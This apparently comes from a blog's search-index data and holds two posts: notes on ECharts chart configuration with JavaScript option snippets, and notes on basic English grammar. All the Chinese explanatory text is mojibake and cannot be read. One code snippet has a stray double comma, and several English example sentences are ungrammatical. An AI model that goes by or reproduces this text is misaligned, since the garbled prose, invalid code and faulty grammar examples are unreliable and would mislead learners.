çš„æ–¹å¼ä¾†çœ‹æœƒæ›´å¥½ç†è§£ dataset: { source: [ ['product', '2015', '2016', '2017'], ['Matcha Latte', 89.3, 92.1, 94.4, 85.4], ['Milk Tea', 95.8, 89.4, 91.2, 76.9], ['Cheese Cocoa', 97.7, 83.1, 92.5, 78.1], ['Walnut Brownie', 66.7, 75.1, 88.5, 69.1] ] }, series: [{ type: 'bar' }, { type: 'bar' }, { type: 'bar' }]} æˆ‘è¦ºå¾—é€™æ¨£å¯«çš„å¦ä¸€å€‹å¥½è™•æ˜¯ã€ŒæŠŠè³‡æ–™æŠ½é›¢ã€ï¼Œç¾åœ¨æ‰€æœ‰è·Ÿè³‡æ–™æœ‰é—œçš„æ±è¥¿éƒ½åªæ”¾åœ¨ dataset.source è£¡ï¼Œè€Œ series çš„è·è²¬åªå‰©ä¸‹å‘ˆç¾æ–¹å¼ã€‚æ›å¥è©±èªªå°±æœ‰é»åƒæ˜¯æŠŠè³‡æ–™å¾ç•«é¢ä¸ŠæŠ½é›¢å‡ºå»çš„æ„Ÿè¦ºã€‚ ç¸½ä¹‹é€™å…©ç¨®çš„è¼¸å‡ºçµæœéƒ½æœƒä¸€æ¨£ï¼š åº§æ¨™è»¸ï¼ˆAxisï¼‰é€™é‚Šæ˜¯æƒ³è®“ä½ ç†è§£åº•ä¸‹çš„é…ç½®é …ç›®åˆ†åˆ¥ä»£è¡¨ä»€éº¼ï¼š xAxis X è»¸ yAxis Y è»¸ axisLine åº§æ¨™è»¸çš„ã€Œç·šã€ axisTick åº§æ¨™è»¸çš„ã€Œåˆ»åº¦ã€ æ­é…å®˜æ–¹çš„é€™å¼µåœ–æˆ‘è¦ºå¾—æ‡‰è©²å°±å¾ˆå¥½æ‡‚äº†ã€‚ ç¾åœ¨å¦‚æœæˆ‘æƒ³èª¿ X è»¸çš„ã€Œåˆ»åº¦ã€é¡è‰²ï¼Œæˆ‘å¯ä»¥é€™æ¨£é…ç½®ï¼š 1234567891011121314151617181920212223242526const option = { xAxis: { name: 'products', type: 'category', axisTick: { length: 10, lineStyle: { color: 'red' } } }, yAxis: { name: 'sales', type: 'value' }, dataset: { source: [ ['product', '2015', '2016', '2017'], ['Matcha Latte', 89.3, 92.1, 94.4, 85.4], ['Milk Tea', 95.8, 89.4, 91.2, 76.9], ['Cheese Cocoa', 97.7, 83.1, 92.5, 78.1], ['Walnut Brownie', 66.7, 75.1, 88.5, 69.1] ] }, series: [{ type: 'bar' }, { type: 'bar' }, { type: 'bar' }]} å…¶ä»–åƒã€Œè»¸ç·šæ¨™é¡Œã€ã€ã€Œè»¸ç·šæ–‡å­—ã€å’Œã€Œè»¸ç·šæ¨™ç±¤ã€çš„æ”¹æ³•ä¹Ÿæ˜¯ä»¥æ­¤é¡æ¨ã€‚ åœ–ä¾‹ï¼ˆlegendï¼‰åœ–ä¾‹å¯ä»¥æƒ³æˆæ˜¯æ¯ä¸€ç­†è³‡æ–™çš„æ¨™é¡Œï¼Œå¸¸è¦‹çš„ç”¨é€”æ˜¯æ‹¿ä¾†åˆ‡æ›é¡¯ç¤º / éš±è—æŸç­†è³‡æ–™ï¼š åº•ä¸‹æœƒä»‹ç´¹å¹¾å€‹æˆ‘è¦ºå¾—é–‹ç™¼ä¸Šå¯èƒ½æœƒç”¨åˆ°çš„è¨­å®šã€‚ è¨­å®šåœ–ä¾‹çš„ä½ç½® 12345678910111213141516171819const option = { legend: { orient: 'vertical', top: 'center', right: 0 }, dataset: { source: [ ['product', '2015', '2016', '2017'], ['Matcha Latte', 43.3, 85.8, 93.7], ['Milk Tea', 83.1, 73.4, 55.1], ['Cheese Cocoa', 86.4, 65.2, 82.5], ['Walnut Brownie', 72.4, 53.9, 39.1] ] }, xAxis: { type: 'category' }, yAxis: {}, series: [{ type: 'bar' }, { type: 'bar' }, { type: 'bar' }, { type: 'bar' }]} è¨­å®šä¸åŒçš„åœ–ä¾‹ 12345678910111213141516171819202122232425262728293031const option = { legend: { data: [ { name: '2015', icon: 'rect' // ç¬¬ä¸€å€‹ }, { name: '2016', icon: 'circle' // ç¬¬äºŒå€‹ }, { name: '2017', icon: 'diamond' // ç¬¬ä¸‰å€‹ } ] }, dataset: { source: [ ['product', '2015', '2016', '2017'], ['Matcha Latte', 43.3, 85.8, 93.7], ['Milk Tea', 83.1, 73.4, 55.1], ['Cheese Cocoa', 86.4, 65.2, 82.5], ['Walnut Brownie', 72.4, 53.9, 39.1] ] }, xAxis: { type: 'category' }, yAxis: {}, series: [{ type: 'bar' }, { type: 'bar' }, { type: 'bar' }, { type: 'bar' }]} è¨­å®šé è¨­éš±è— / é¡¯ç¤º 123456789101112131415161718192021const option = { legend: { selected: { 2015: false, 2016: true, 2017: true } },, dataset: { source: [ ['product', '2015', '2016', '2017'], ['Matcha Latte', 43.3, 85.8, 93.7], ['Milk Tea', 83.1, 73.4, 55.1], ['Cheese Cocoa', 86.4, 65.2, 82.5], ['Walnut Brownie', 72.4, 53.9, 39.1] ] }, xAxis: { type: 'category' }, yAxis: {}, series: [{ type: 'bar' }, { type: 'bar' }, { type: 'bar' }, { type: 'bar' }]}","link":"/2022/11/02/echarts-note/"},{"title":"åŸºç¤è‹±æ–‡æ–‡æ³•","text":"å‰è¨€å…¶å¯¦åŸæœ¬æ˜¯è¨ˆç•«å¯«æˆä¸€ç¯‡ä¸€ç¯‡çš„æ•™å­¸ç³»åˆ—æ–‡ï¼Œä¸éå¾Œä¾†ç™¼ç¾å…¶å¯¦è‹±æ–‡è¦å­¸çš„æ±è¥¿å‡ºä¹æ„æ–™çš„å¤šï¼æ‰€ä»¥ï¼Œæˆ‘æƒ³è¦ºå¾—æ”¹ç”¨é€™ç¨®åƒæ˜¯æ‡¶äººåŒ…çš„æ–¹å¼æ‡‰è©²æœƒæ¯”è¼ƒé©åˆã€‚ é€™è£¡æœƒæŠŠä¸€äº›è‹±æ–‡çš„åŸºæœ¬çŸ¥è­˜ï¼Œæˆ–æ˜¯ä½ å¯èƒ½çœ‹éçš„ä¸€äº›è‹±æ–‡ç”¨æ³•ï¼Œå…¨éƒ¨é›†åˆæˆä¸€ç¯‡å¯èƒ½æ¯”è¼ƒç°¡å–®çš„è³‡æ–™é›†åˆï¼Œ ä¸éè¦å…ˆæé†’å„ä½ï¼Œé€™ç¯‡æ–‡ç« åŸºæœ¬ä¸Šå°±æ˜¯ç­†è¨˜å–å‘ï¼Œä»¥ç°¡å–®å¿«é€Ÿç‚ºä¸»ï¼Œæ‰€ä»¥æƒ³æ·±å…¥äº†è§£çš„è©±ï¼Œé‚„æ˜¯è¦è«‹å„ä½è‡ªå·±åœ¨å¤šæ‰¾ä¸€äº›è³‡æ–™ä¾†è¼”åŠ©ã€‚ å¦å¤–ç‚ºäº†å‘¼æ‡‰é€™å€‹æ–‡ç« çš„æ¨™é¡Œï¼Œæ²’æœ‰éŒ¯ï¼Œåªè¦æˆ‘çœ‹åˆ°ä»€éº¼æ–°çš„çŸ¥è­˜ï¼Œå°±æœƒæ›´æ–°é€™ç¯‡æ–‡ç« çš„å…§å®¹ï¼Œæ‰€ä»¥å¯èƒ½æœƒæ™‚å¸¸æ›´æ–°ä¹Ÿèªªä¸å®šã€‚ ç¸½ä¹‹ï¼Œå¦‚æœä½ æƒ³å¿«é€Ÿçš„æŸ¥ä¸€äº›åŸºæœ¬çš„æ¦‚å¿µï¼Œé€™è£¡æ‡‰è©²æ˜¯å€‹ä¸éŒ¯çš„åœ°æ–¹ï¼Œä½†å¦‚æœä½ è¿½æ±‚çš„æ˜¯ä¸€åˆ€æœªå‰ªï¼Œé‚£æˆ‘æƒ³é€™è£¡å¯èƒ½å°±ä¸å¤ªé©åˆä½ å›‰ã€‚ å°è¦½ èªæ…‹ å…ˆè¡Œè© åŒä½èª æŒ‡ç¤ºä»£åè© å„ç¨®é€£æ¥è©ç¨®é¡ å‹•ç‹€è© åŠç‰©å‹•è© / ä¸åŠç‰©å‹•è© é€£ç¶´å‹•è© ä½¿å½¹å‹•è© é—œæ–¼é•·å¥ å°ç­‰é€£æ¥è© å‹•åè© / åŸå½¢å‹•è©æ”¾åœ¨å¥é¦– é—œæ–¼å­å¥ will èˆ‡ be going to å·®ç•° either çš„å„ç¨®ç”¨æ³• as çš„å„ç¨®ç”¨æ³• as if since çš„å„ç¨®ç”¨æ³• Consider çš„ç”¨æ³• If I were â€¦ å¦‚æœæˆ‘â€¦ Rather than èªæ…‹ä¸»å‹•èªæ…‹ä¸»è©æ˜¯å‹•ä½œçš„ã€Œç™¼èµ·è€…ã€ ä¸»è© + å‹•è© I made a mistake.æˆ‘çŠ¯äº†ä¸€å€‹éŒ¯èª¤ã€‚ I create a robot.æˆ‘è£½é€ äº†ä¸€å€‹æ©Ÿå™¨äººã€‚ è¢«å‹•èªæ…‹ä¸»è©æ˜¯å‹•ä½œçš„ã€Œæ‰¿å—è€…ã€ be + éå»åˆ†è© This story was written by me.é€™å€‹æ•…äº‹æ˜¯æˆ‘å¯«çš„ã€‚ This dishes was made by me.é€™é“æ–™ç†æ˜¯æˆ‘åšçš„ã€‚ è£œå……ï¼ä¸åŠç‰©å‹•è©çš„è¢«å‹•èªæ…‹ be + å‹•è© + ä»‹ä¿‚è© + by He consented to the proposal.ï¼ˆä¸»å‹•ï¼‰ä»–åŒæ„é€™é …å»ºè­°ã€‚ The proposal was consented to by himï¼ˆè¢«å‹•ï¼‰é€™å€‹å»ºè­°è¢«ä»–åŒæ„ A car ran over a dog.ï¼ˆä¸»å‹•ï¼‰ä¸€å°è»Šè¼¾éäº†ä¸€éš»ç‹— A dog was run over by a car.ï¼ˆè¢«å‹•ï¼‰ä¸€éš»ç‹—è¢«ä¸€å°è»Šè¼¾é å…ˆè¡Œè©è¢«ä»£åè©æ‰€ä»£æ›¿çš„è©ä¹Ÿå¯ä»¥é€™æ¨£è¨˜ï¼šç”¨ä¾†ä»£æ›¿åœ¨å‰é¢å…ˆå‡ºç¾çš„é‚£å€‹ä¸»è© or åè© Jim lost his data. Jim å¼„ä¸Ÿäº†å®ƒçš„è³‡æ–™ Jim lost his data å…ˆè¡Œè© å‹•è© ä»£åè© åè© The handsome man who had his wallet stole, was in shock. é‚£å€‹éŒ¢åŒ…è¢«å·èµ°çš„å¸¥å“¥åš‡å£äº†ã€‚ The handsome man who had his wallet stole, was in shock å…ˆè¡Œè© ä»£åè©ï¼ˆé—œä¿‚ä»£åè©ï¼‰ é—œä¿‚å­å¥ åƒè€ƒè³‡æ–™å¯¦ç”¨åŸºç¤æ–‡æ³•ï¼ˆå…ˆè¡Œè©ï¼‰ åŒä½èªç”¨ä¾†å¹«å‰é¢å‡ºç¾çš„åè©ã€ä»£åè©ã€åè©ç‰‡èªä½œè£œå……èªªæ˜åŒä½èªæœ¬èº«æ˜¯å€‹åè© or åè©ç‰‡èª å¯ä»¥å†åˆ†æˆï¼š é™å®šåŒä½èªï¼ˆå¿…è¦è³‡è¨Šã€ä¸å¯çœç•¥ï¼‰ éé™å®šåŒä½èªï¼ˆè£œå……é¡å¤–è³‡è¨Šã€ä»¥é€—è™Ÿéš”é–‹ï¼‰ ï¼ˆå¤§è‡´ä¸Šè·Ÿé™å®šé—œä»£ã€éé™å®šé—œä»£æ˜¯åŒå€‹æ¦‚å¿µï¼Œåƒè€ƒé€™è£¡ï¼‰ é™å®šåŒä½èª We Taiwanese are diligent in our work.æˆ‘å€‘å°ç£äººå‹¤å¥®å·¥ä½œã€‚ Eve made the decison that she will move to Canada next year.Eve æ±ºå®šå¥¹æ˜å¹´è¦æ¬å»åŠ æ‹¿å¤§ã€‚ éé™å®šåŒä½èª This is my son, Jack.é€™æ˜¯æˆ‘çš„å…’å­ï¼Œå‚‘å…‹ã€‚ I usually have lunch at Mcdonaldâ€™s, my favorite restaurant nearby.æˆ‘é€šå¸¸åœ¨éº¥ç•¶å‹åƒåˆé¤ï¼Œé€™é™„è¿‘æˆ‘æœ€å–œæ­¡çš„é¤å»³ã€‚ åƒè€ƒè³‡æ–™å¯¦ç”¨åŸºç¤æ–‡æ³•ï¼ˆåŒä½èªï¼‰è‹±æ–‡ä¸­çš„ã€ŒåŒä½èªã€æ˜¯ä»€éº¼ï¼Ÿé‚„åˆ†é™å®šè·Ÿéé™å®šï¼Ÿ æŒ‡ç¤ºä»£åè©å¯ä»¥ç•¶ä¸»è© or å—è© this that these those é€™å€‹ é‚£å€‹ é€™äº› é‚£äº› This is the one I want.é€™å€‹å°±æ˜¯æˆ‘æƒ³è¦çš„ã€‚ That is my girlfriend.é€™æ˜¯æˆ‘çš„å¥³æœ‹å‹ã€‚ These are my families.é€™äº›æ˜¯æˆ‘çš„å®¶äººã€‚ Those are his brothers.é‚£äº›æ˜¯ä»–çš„å…„å¼Ÿã€‚ åƒè€ƒè³‡æ–™å¯¦ç”¨åŸºç¤æ–‡æ³•ï¼ˆæŒ‡ç¤ºä»£åè©ï¼‰ åèº«ä»£åè©ç•¶ä¸»è©è·Ÿå—è©ç›¸åŒæ™‚ï¼Œå¯ä»¥ç”¨åèº«ä»£åè©ç•¶ä½œå—è© å—æ ¼ + self / selves å–®æ•¸ myself yourself herself himself itself I taught myself to program.æˆ‘è‡ªå­¸ç·¨ç¨‹ è¤‡æ•¸ ourselves yourselves themselves by + åèº«ä»£åè©æœ‰è¡¨ç¤ºç¨è‡ªçš„æ„æ€ Jim finished the work by himself.Jim ç¨è‡ªå®Œæˆé€™å€‹å·¥ä½œã€‚ Karen prefers to live by herself.Karen æ¯”è¼ƒå–œæ­¡è‡ªå·±ä¸€å€‹äººä½ã€‚ I prepared a big meal by myself.æˆ‘è‡ªå·±æº–å‚™äº†è±ç››çš„ä¸€é¤ã€‚ åƒè€ƒè³‡æ–™å¯¦ç”¨åŸºç¤æ–‡æ³•ï¼ˆåèº«ä»£åè©ï¼‰è‹±æ–‡ç°¡å–®å­¸ â€“ å¼·èª¿â€è‡ªå·±â€çš„åèº«ä»£åè©ï½œ EF ENGLISH LIVE éƒ¨è½æ ¼ å„ç¨®é€£æ¥è©ç¨®é¡é€£æ¥è©å¯ä»¥åˆ†æˆï¼š å°ç­‰é€£çµè© å¾å±¬é€£æ¥è© é…å°é€£æ¥è© é™¤äº†é€™äº›ä»¥å¤–ï¼š é—œä¿‚ä»£åè© é€£æ¥å‰¯è© ä¹Ÿæœ‰é€£æ¥å­å¥çš„åŠŸèƒ½ã€‚ å°ç­‰é€£æ¥è©ï¼ˆå…©ç«¯éƒ½è¦é•·ä¸€æ¨£ï¼‰ and â†’ å’Œ but â†’ ä¹Ÿä¸ï¼ˆæ²’ï¼‰ or â†’ æˆ–è€… nor â†’ é…åˆå‰é¢çš„å¦å®šèªç¾© for â†’ å› ç‚º so â†’ æ‰€ä»¥ yet â†’ ç„¶è€Œ å¯ä»¥ç”¨ä¾†é€£æ¥å¥å­ä¸­çš„ï¼š å­— ç‰‡èª å­å¥ éœ€è¦æ³¨æ„ï¼šé€£æ¥è©é€£æ¥çš„å…©ç«¯å¿…é ˆè¦æ˜¯ç›¸ç­‰çš„ã€‚ ã€Œå­—ã€è¦å°ã€Œå­—ã€ã€ã€Œç‰‡èªã€è¦å°ã€Œç‰‡èªã€ã€ã€Œå­å¥ã€è¦å°ã€Œå­å¥ã€ã€‚ ä¾‹å¦‚ï¼š Edward is kind and courageous. ï¼ˆå½¢å®¹è©ï¼‰ She is a loving mother and a loyal firend.ï¼ˆç‰‡èªï¼‰ Betty lived life fully and completelyï¼ˆå‰¯è©ï¼‰ åˆ©ç”¨å°ç­‰é€£æ¥è©çµåˆç¨ç«‹å­å¥ï¼ˆè®Šæˆåˆå¥ï¼‰å‰é¢çš„ç¨ç«‹å­å¥é€šå¸¸æœƒè·Ÿè‘—ä¸€å€‹ã€,ã€ï¼Œç„¶å¾Œæ‰æ˜¯å°ç­‰é€£æ¥è©ï¼Œé€£æ¥å¾Œé¢çš„ç¨ç«‹å­å¥ã€‚ ä¾‹å­ï¼š I woke up early, and I drank a coffee.æˆ‘å¾ˆæ—©èµ·åºŠï¼Œè€Œæˆ‘å–äº†ä¸€æ¯å’–å•¡ã€‚ She study hard, but she doesnâ€™t pass the test.å¥¹å¾ˆèªçœŸå­¸ç¿’ï¼Œä½†å¥¹ä¸¦æ²’æœ‰é€šéæ¸¬è©¦ã€‚ We can go to a restaurant, or we can just eat leftovers.æˆ‘å€‘å¯ä»¥å»é¤å»³åƒé£¯ï¼Œæˆ–æˆ‘å€‘ä¹Ÿå¯ä»¥åªåƒå‰©é£¯ã€‚ Be here on time, or weâ€™ll leave without you.æº–æ™‚åˆ°é€™è£¡ï¼Œå¦å‰‡æˆ‘å€‘å°±ä¸Ÿä¸‹ä½ ä¸€å€‹ã€‚ I never see him again, nor did I regret it.æˆ‘å†ä¹Ÿæ²’æœ‰è¦‹åˆ°ä»–ï¼Œæˆ‘ä¹Ÿæ²’æœ‰å¾Œæ‚”ã€‚ I couldnâ€™t stay, for the room was too noisy.æˆ‘æ²’æœ‰è¾¦æ³•ç•™ä¸‹ï¼Œå› ç‚ºæˆ¿é–“å¤ªåµäº†ã€‚ It was raining, so I took my umbrella.å› ç‚ºä¸‹é›¨ï¼Œæ‰€ä»¥æˆ‘å¸¶äº†å‚˜ã€‚ It is good, yet it could be improved.é€™å¾ˆå¥½ï¼Œä½†å®ƒé‚„æ˜¯å¯ä»¥è¢«æ”¹å–„ã€‚ å¾å±¬é€£æ¥è© as â†’ ç”±æ–¼ although â†’ é›–ç„¶ because â†’ å› ç‚º until â†’ ç›´åˆ° Even though â†’ é›–ç„¶ in order â†’ ç‚ºäº† since â†’ ç”±æ–¼ while â†’ ç•¶ã€ç„¶è€Œ whereas â†’ è€Œ when â†’ ç•¶ã€æ—¢ç„¶ if â†’ å¦‚æœ whenever â†’ ç„¡è«–åœ¨å“ªè£¡ã€ç„¡è«–åœ¨ä»€éº¼æƒ…æ³ä¸‹ å¾å±¬å­å¥ä¸ä¸€å®šè¦æ”¾åœ¨ç¨ç«‹å­å¥å¾Œé¢ï¼Œæ”¾åœ¨å‰é¢çš„æ™‚æœ‰æ›´åŠ å¼·èª¿çš„èªæ„ I got the airport almost too late to catch my flight even though I left home early.æˆ‘å·®é»è¶•ä¸ä¸Šç­æ©Ÿï¼ˆå¼·èª¿ï¼‰ï¼Œå³ä¾¿æˆ‘å¾ˆæ—©å°±å‡ºé–€äº†ã€‚ Even though I left home early, I got the airport almost too late to catch my flight.å³ä¾¿æˆ‘å¾ˆæ—©å°±å‡ºé–€äº†ï¼ˆå¼·èª¿ï¼‰ï¼Œä½†é‚„æ˜¯è¶•ä¸ä¸Šç­æ©Ÿã€‚ Since I was a child, I have wanted to visit Japan.åœ¨æˆ‘é‚„å°çš„æ™‚å€™ï¼ˆå¼·èª¿ï¼‰ï¼Œæˆ‘å°±æƒ³è¦å»æ—¥æœ¬ã€‚ I have wanted to visit Japan since I was a child.æˆ‘æ—©å°±æƒ³å»æ—¥æœ¬äº†ï¼ˆå¼·èª¿ï¼‰ï¼Œåœ¨æˆ‘é‚„å°çš„æ™‚å€™ã€‚ é…å°é€£æ¥è© eitherâ€¦ or â†’ ä¸æ˜¯ A å°±æ˜¯ B not onlyâ€¦ but also â†’ ä¸ä½†â€¦ è€Œä¸” asâ€¦ so â†’ åªè¦â€¦ å°±æœƒ whetherâ€¦ orâ†’ ä¸è«–â€¦æˆ– neitherâ€¦ norâ†’ æ—¢ä¸æ˜¯ A ä¹Ÿä¸æ˜¯ B bothâ€¦ andâ†’ A å’Œ B å…©è€…éƒ½â€¦ soâ€¦ thatâ†’ å¦‚æ­¤â€¦ ä»¥è‡³æ–¼ not so muchâ€¦ as â†’ èˆ‡å…¶èªª Aâ€¦ ä¸å¦‚èªª B ä¾‹å­ï¼š Either June or Bob knows where she went.ä¸æ˜¯ June å°±æ˜¯ Bob çŸ¥é“å¥¹çš„å»å‘ã€‚ Neither Alex nor Alice knew the whole truth.Alex å’Œ Alice éƒ½ä¸çŸ¥é“çœŸç›¸ã€‚ Both Nancy and I went to the moive.Nancy å’Œæˆ‘éƒ½å»çœ‹é›»å½±äº†ã€‚ Larry was so busy that he didnâ€™t have time to eat lunch.Larry å¿™å¾—æ²’æœ‰æ™‚é–“åƒåˆé¤ã€‚ It doesnâ€™t matter whenever he is rich or poor, I will marry him.ä¸è«–ä»–å¯Œæœ‰é‚„æ˜¯è²§å›°ï¼Œæˆ‘éƒ½æœƒå«çµ¦ä»–ã€‚ I am not so much angry as sad.èˆ‡å…¶èªªæˆ‘æ˜¯ç”Ÿæ°£ï¼Œä¸å¦‚èªªæ˜¯é›£éã€‚ åƒè€ƒè³‡æ–™å¯¦ç”¨åŸºç¤æ–‡æ³•ï¼ˆé€£çµè©ï¼‰å¯¦ç”¨åŸºç¤æ–‡æ³•ï¼ˆå°ç­‰é€£çµè©ï¼‰ã€ä½ çš„å¥å­æœ‰å¹¾å€‹å­—ã€‘æ‹‰é•·å¥å­çš„å¦™æ–¹ï¼šå­å¥ é€£ç¶´å‹•è©å¦‚æœé€£ç¶´é€™å€‹è©è½èµ·ä¾†å¾ˆé¥’å£é‚£å‘Šè¨´ä½ ä¸€å€‹å°æ•…äº‹ï¼š å¤æ™‚å€™æˆ‘å€‘è¡£æœç ´æ‰çš„æ™‚å€™ï¼Œéƒ½æœƒç”¨ã€Œè£œç¶´ã€é€™å€‹è©ä¾†è¡¨ç¤ºã€Œä¿®è£œè¡£æœã€ï¼Œè€Œé€£ç¶´å‹•è©å¾Œé¢æ¥çš„å½¢å®¹è©åˆæœ‰ã€Œè£œèªã€çš„åŠŸèƒ½ï¼Œ æ‰€ä»¥æ‰æœƒæœ‰ã€Œç¶´ã€é€™å€‹è©çš„ç”±ä¾†ã€‚ ç•¶ç„¶ï¼Œä½ ä¹Ÿèƒ½é †ä¾¿è¨˜ä¸€ä¸‹ï¼Œé€£ç¶´å‹•è©å¾Œé¢å¯ä»¥æ¥è£œèªä¾†ä¿®é£¾ä¸»è©é€™ä»¶äº‹ã€‚ ä½œç”¨èˆ‡ç‰¹æ€§ä¸»è© + é€£ç¶´ + å½¢å®¹è© â†’ ä»£è¡¨ä¿®é£¾ Sã€‚ä¸»è© + é€£ç¶´ + åè© â†’ ä»£è¡¨ S = åè©ã€‚ ä¸€ç¨®æ²’æœ‰å‹•ä½œçš„å‹•è© ä¸èƒ½æ¥å—è©ï¼ˆå› ç‚ºä¸åŠç‰©ï¼‰ è£œèªç‚ºä¸€å€‹åè©æˆ–å½¢å®¹è©çš„å–®å­—ã€ç‰‡èªã€å­å¥ ä¾‹å¦‚ï¼š I am an engineer.æˆ‘æ˜¯ä¸€å€‹å·¥ç¨‹å¸«ã€‚ I am an engineer ä¸»è© é€£ç¶´å‹•è©ï¼ˆbeï¼‰ åè©ç‰‡èªï¼ˆä¸å®šå† è© + åè©ï¼‰ æˆ‘ æ˜¯ ä¸€å€‹å·¥ç¨‹å¸« æˆ‘ = å·¥ç¨‹å¸« He is capable.ä»–å¾ˆæœ‰èƒ½åŠ›ã€‚ He is capable ä¸»è© é€£ç¶´å‹•è©ï¼ˆbeï¼‰ å½¢å®¹è© ä»– å¾ˆæœ‰èƒ½åŠ›ï¼ˆä¿®é£¾ï¼‰ æ¯”è¼ƒç‰¹åˆ¥çš„æ¡ˆä¾‹ï¼ˆå£èª vs æ–‡æ³•ï¼‰ Donâ€™t blame Him. It was â€œIâ€ who woke you from a sound sleep. Donâ€™t blame Him. It was â€œmeâ€ who woke you from a sound sleep. å¾èªæ³•ä¸Šä¾†èªªï¼Œä½¿ç”¨ I æ‰æ˜¯æ­£ç¢ºçš„ï¼Œä½†æˆ‘å€‘å…¶å¯¦å£èªä¸Šä½ ä¸€å®šæ˜¯ç¢°åˆ° me çš„æƒ…æ³æ¯”è¼ƒå¤šã€‚è€Œä¹‹æ‰€ä»¥è¦ä½¿ç”¨ Iï¼Œæ˜¯å› ç‚ºé€™å¾çµæ§‹ä¾†çœ‹çš„è©±é€™å€‹å¥å­æœƒæ˜¯é€™æ¨£å­ï¼š It was I ä¸»è© é€£ç¶´å‹•è©ï¼ˆbeï¼‰ åè© Itï¼ˆæŠŠä½ å¾ç¡å¤¢ä¸­åµé†’çš„äººï¼‰ æ˜¯ Iï¼ˆæˆ‘ï¼‰ é‚„è¨˜å¾—é€£ç¶´å‹•è©çš„çµæ§‹å—ï¼Ÿ â†’ ä¸»è© + é€£ç¶´å‹•è© + åè©/å½¢å®¹è©åœ¨é€™å€‹ä¾‹å­ä¸­ï¼Œme æ˜¯ä¸€å€‹å—è©ï¼Œè€Œ I æ‰æ˜¯åè©ï¼Œæ‰€ä»¥å¾æ–‡æ³•ä¸Šä¾†èªªæ‰æœƒå¿…é ˆè¦ä½ ç”¨ I è€Œä¸æ˜¯ meã€‚ ä½¿å½¹å‹•è©ä¸»å‹•èªæ…‹DEF : å‘½ä»¤ä»–äººã€æŒ‡ä½¿ä»–äººã€Œåšã€æŸä»¶äº‹ make å¼·è¿«æŸäººåšæŸäº‹ have äº¤ä»˜æŸäººä»»å‹™ã€å«æŸäººåšäº‹ let è®“æŸäººåšäº‹ get èªªæœæŸäººåšäº‹ã€å«æŸäººåšäº‹ åŸºæœ¬çµæ§‹ï¼š ä½¿å½¹å‹•è© + å—è© + åŸå½¢å‹•è© My mom made me study hard.æˆ‘åª½å¼·è¿«æˆ‘èªçœŸå­¸ç¿’ My parent have us clean our rooms once a week.çˆ¸åª½å«æˆ‘å€‘æ¯å‘¨æ•´ç†ä¸€æ¬¡æˆ¿é–“ã€‚ I let my girlfriend stay with me.æˆ‘è®“æˆ‘å¥³å‹é™ªä¼´æˆ‘ get éœ€ä½¿ç”¨ get + å—è© + to + åŸå½¢å‹•è©çš„çµæ§‹The custome got the clerk to wrap up the present for him.å®¢äººå«åº—å“¡å¹«å¥¹åŒ…è£ç¦®ç‰© è¢«å‹•èªæ…‹ make / have / get + å—è© + éå»åˆ†è© let + å—è© + be + éå»åˆ†è© we have our office cleaned every weekend.æˆ‘å€‘å®‰æ’è¾¦å…¬å®¤æ¯å‘¨éƒ½è¢«æ‰“æƒ How could you let your mother be insulted like that?ä½ æ€éº¼èƒ½è®“ä½ åª½åª½å¦‚æ­¤å—è¾±ï¼Ÿ The accident got Kevin fired.é€™å ´æ„å¤–è®“ Kevin è¢«ç‚’é­·é­š èˆ‡ä½¿å½¹é¡ä¼¼çš„å‹•è© need éœ€è¦æŸäººåšæŸäº‹ want æƒ³è¦æŸäººåšæŸäº‹ ask è«‹æ±‚æŸäººåšæŸäº‹ tell å‘Šè¨´æŸäººåšæŸäº‹ çµæ§‹ï¼šå‹•è© + å—è© + to + åŸå½¢å‹•è©ï¼ˆä¸å®šè©ï¼‰ My boss wants me to fix the bug tomorrow.è€é—†è¦æˆ‘æ˜å¤©ä¿®å¥½ bug My gf asked me to take her home tomorrow.æˆ‘å¥³å‹è«‹æˆ‘æ˜å¤©è¼‰å¥¹å›å®¶ åƒè€ƒè³‡æ–™å¤šç›Šå¿…è€ƒï¼šä½¿å½¹å‹•è©-makeã€haveã€letã€get-ç”¨æ³•å¤§è§£æï¼ ä¾†é»ä¸ä¸€æ¨£çš„ï¼Œé€£ç¶´å‹•è© + like + åè©åŸºæœ¬ä¸Šè¦è·Ÿæ„Ÿå®˜é¡çš„é€£ç¶´å‹•è©ä¸€èµ·ç”¨ look çœ‹èµ·ä¾† sound è½èµ·ä¾† smell èèµ·ä¾† taste åƒèµ·ä¾† feel æ„Ÿè¦ºèµ·ä¾† ä¾‹å­ï¼š This robot looks like a dog.é€™å€‹æ©Ÿå™¨äººçœ‹èµ·ä¾†åƒéš»ç‹— She sounds like unhappiness.ä»–è½èµ·ä¾†ä¸å¤ªé–‹å¿ƒ The room smells like a trash.é‚£å€‹æˆ¿é–“èèµ·ä¾†åƒåƒåœ¾ This food taste like pot sticker.é€™å€‹é£Ÿç‰©åƒèµ·ä¾†åƒé‹è²¼ I feel like a loser.æˆ‘æ„Ÿè¦ºåƒå€‹è¼¸å®¶ åƒè€ƒè³‡æ–™å¯¦ç”¨åŸºç¤æ–‡æ³•ï¼ˆé€£ç¶´å‹•è©ï¼‰è‹±æ–‡ã€Œé€£ç¶´å‹•è©ã€è®“ä½ æè¿°ã€Œæ„Ÿå—ã€æ›´è²¼åˆ‡ - ç©ºä¸­ç¾èªè®“ä½ ç²¾æº–æè¿°çš„è¶…ç´šå¥½å¹«æ‰‹ï¼ï¼é€£ç¶´å‹•è©&lt; å‹•ç‹€è©å‹•ç‹€è©ä¸æ˜¯å‹•è© å‹•åè©ï¼ˆ-ingï¼‰ â†’ åè© åˆ†è©ï¼ˆç¾åœ¨ -ing / éå» -ed) â†’ å½¢å®¹è© ä¸å®šè© â†’ åè©ã€å½¢å®¹è©ã€å‰¯è© åŠç‰©å‹•è© / ä¸åŠç‰©å‹•è©åŠç‰©å‹•è©ä¸€å®šæ¥å—è© S + V + O She cleaned the room.å¥¹æ‰“æƒäº†æˆ¿é–“ éŒ¯èª¤ç¤ºç¯„How was the concert?æ¼”å”±æœƒå¦‚ä½•ï¼Ÿ It was good. I enjoyed very much.(X) It was good. I enjoyed it very much.(O)å¾ˆä¸éŒ¯ï¼Œæˆ‘å¾ˆå–œæ­¡å®ƒã€‚ ä¸åŠç‰©å‹•è©ä¸æ¥å—è©ï¼Œä¸ç„¶å°±æ˜¯ä»‹ä¿‚è© + å—è© S + V S + V + Prep + O Who cares.èª°åœ¨ä¹ã€‚ éŒ¯èª¤ç¤ºç¯„Wait me.(X) Wait for me.(O)ç­‰çª©å•¦ 